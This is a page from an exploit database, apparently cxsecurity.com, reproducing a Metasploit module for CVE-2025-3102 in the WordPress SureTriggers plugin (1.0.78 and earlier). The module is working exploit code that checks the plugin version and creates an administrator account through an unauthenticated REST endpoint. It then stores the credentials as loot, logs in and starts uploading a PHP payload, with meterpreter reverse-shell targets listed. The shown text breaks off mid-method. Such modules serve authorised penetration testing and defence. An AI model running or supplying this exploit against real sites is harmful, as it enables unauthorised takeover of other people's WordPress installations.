---
title: WordPress SureTriggers 1.0.78 Authentication Bypass / Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2025050034
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-05-16
fetch_date: 2025-10-06T22:24:24.913208
---

# WordPress SureTriggers 1.0.78 Authentication Bypass / Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WordPress SureTriggers 1.0.78 Authentication Bypass / Remote Code Execution** **2025.05.15**  Credit:  **[Valentin](https://cxsecurity.com/author/Valentin/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-3102](https://cxsecurity.com/cveshow/CVE-2025-3102/ "Click to see CVE-2025-3102")**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Payload::Php
include Msf::Auxiliary::Report
include Msf::Exploit::FileDropper
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::Remote::HTTP::Wordpress
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'WordPress SureTriggers Auth Bypass and RCE',
'Description' => %q{
This module exploits an authorization bypass in the WordPress SureTriggers plugin (<= 1.0.78).
It first creates a new administrator account via the unauthenticated REST endpoint,
then uploads and executes a PHP payload using FileDropper for remote code execution.
},
'Author' => [
'Michael Mazzolini (mikemyers)', # Vulnerability Discovery
'Khaled Alenazi (Nxploited)', # PoC
'Valentin Lobstein' # Metasploit module
],
'References' => [
['CVE', '2025-3102'],
['URL', 'https://github.com/Nxploited/CVE-2025-3102'],
['URL', 'https://www.wordfence.com/blog/2025/04/100000-wordpress-sites-affected-by-administrative-user-creation-vulnerability-in-suretriggers-wordpress-plugin/']
],
'License' => MSF\_LICENSE,
'Privileged' => false,
'Platform' => %w[unix linux win php],
'Arch' => [ARCH\_PHP, ARCH\_CMD],
'Targets' => [
[
'PHP In-Memory',
{
'Platform' => 'php',
'Arch' => ARCH\_PHP
# tested with php/meterpreter/reverse\_tcp
}
],
[
'Unix In-Memory',
{
'Platform' => %w[unix linux],
'Arch' => ARCH\_CMD
# tested with cmd/linux/http/x64/meterpreter/reverse\_tcp
}
],
[
'Windows In-Memory',
{
'Platform' => 'win',
'Arch' => ARCH\_CMD
}
]
],
'DefaultTarget' => 0,
'DisclosureDate' => '2025-03-13',
'Notes' => {
'Stability' => [CRASH\_SAFE],
'SideEffects' => [ARTIFACTS\_ON\_DISK, IOC\_IN\_LOGS],
'Reliability' => [REPEATABLE\_SESSION]
}
)
)
register\_options(
[
OptString.new('WP\_USER', [true, 'Username for the new administrator', Faker::Internet.username(specifier: 5..8)]),
OptString.new('WP\_PASS', [true, 'Password for the new administrator', Faker::Internet.password(min\_length: 12)]),
OptString.new('WP\_EMAIL', [true, 'Email for the new administrator', Faker::Internet.email(name: Faker::Internet.username(specifier: 5..8))]),
OptString.new('ST\_AUTH', [false, 'Value for st\_authorization header', ''])
]
)
end
def check
return CheckCode::Unknown('Target not responding') unless wordpress\_and\_online?
wp\_version = wordpress\_version
print\_status("Detected WordPress version: #{wp\_version}") if wp\_version
plugin = 'suretriggers'
readme = check\_plugin\_version\_from\_readme(plugin, '1.0.79', '0.0.1')
detected = readme&.details&.dig(:version)
if detected.nil?
return CheckCode::Unknown("Unable to determine the #{plugin} plugin version.")
end
detected\_version = Rex::Version.new(detected)
if detected\_version <= Rex::Version.new('1.0.78')
return CheckCode::Appears("Detected #{plugin} version #{detected\_version}")
end
CheckCode::Safe("#{plugin} #{detected\_version} >= 1.0.79 appears patched")
end
def exploit
print\_status('Attempting to create administrator user via auth bypass...')
create\_uri = normalize\_uri(target\_uri.path, 'wp-json', 'sure-triggers', 'v1', 'automation', 'action')
headers = { 'st\_authorization' => datastore['ST\_AUTH'] }
payload = user\_payload.to\_json
res = send\_request\_cgi(
'method' => 'POST',
'uri' => create\_uri,
'ctype' => 'application/json',
'data' => payload,
'headers' => headers
)
unless res&.code == 200 && res.get\_json\_document&.dig('success')
print\_warning('Primary endpoint failed, trying fallback via rest\_route...')
res = send\_request\_cgi(
'method' => 'POST',
'uri' => normalize\_uri(target\_uri.path),
'vars\_get' => { 'rest\_route' => '/sure-triggers/v1/automation/action' },
'ctype' => 'application/json',
'data' => payload,
'headers' => headers
)
end
unless res&.code == 200 && res.get\_json\_document&.dig('success')
fail\_with(Failure::UnexpectedReply, 'User creation did not return success')
end
print\_good("Administrator created: #{datastore['WP\_USER']}:#{datastore['WP\_PASS']}")
create\_credential(
workspace\_id: myworkspace\_id,
origin\_type: :service,
module\_fullname: fullname,
username: datastore['WP\_USER'],
private\_type: :password,
private\_data: datastore['WP\_PASS'],
service\_name: 'WordPress',
address: datastore['RHOST'],
port: datastore['RPORT'],
protocol: 'tcp',
status: Metasploit::Model::Login::Status::UNTRIED
)
vprint\_good("Credential for user '#{datastore['WP\_USER']}' stored successfully.")
loot\_data = "Username: #{datastore['WP\_USER']}, Password: #{datastore['WP\_PASS']}\n"
loot\_path = store\_loot(
'wordpress.admin.created',
'text/plain',
datastore['RHOST'],
loot\_data,
'wp\_admin\_credentials.txt',
'WordPress Created Admin Credentials'
)
vprint\_good("Loot saved to: #{loot\_path}")
report\_host(host: datastore['RHOST'])
report\_service(
host: datastore['RHOST'],
port: datastore['RPORT'],
proto: 'tcp',
name: fullname,
info: 'WordPress with vulnerable SureTriggers plugin allowing unauthenticated admin creation'
)
report\_vuln(
host: datastore['RHOST'],
port: datastore['RPORT'],
proto: 'tcp',
name: 'SureTriggers WordPress Plugin Auth Bypass',
refs: references,
info: 'Unauthenticated admin creation via vulnerable REST API endpoint'
)
cookie = wordpress\_login(datastore['WP\_USER'], datastore['WP\_PASS'])
upload\_and\_execute\_payload(cookie)
end
def user\_payload
{
'integration' => 'WordPress',
'type\_event' => 'create\_user\_if\_not\_exists',
'selected\_options' => {
'user\_name' => datastore['WP\_USER'],
'password' => datastore['WP\_PASS'],
'user\_email' => datastore['WP\_EMAIL'],
'role' => 'administrator'
},
'fields' => [],
'context' => {}
}
end
def upload\_and\_execute\_...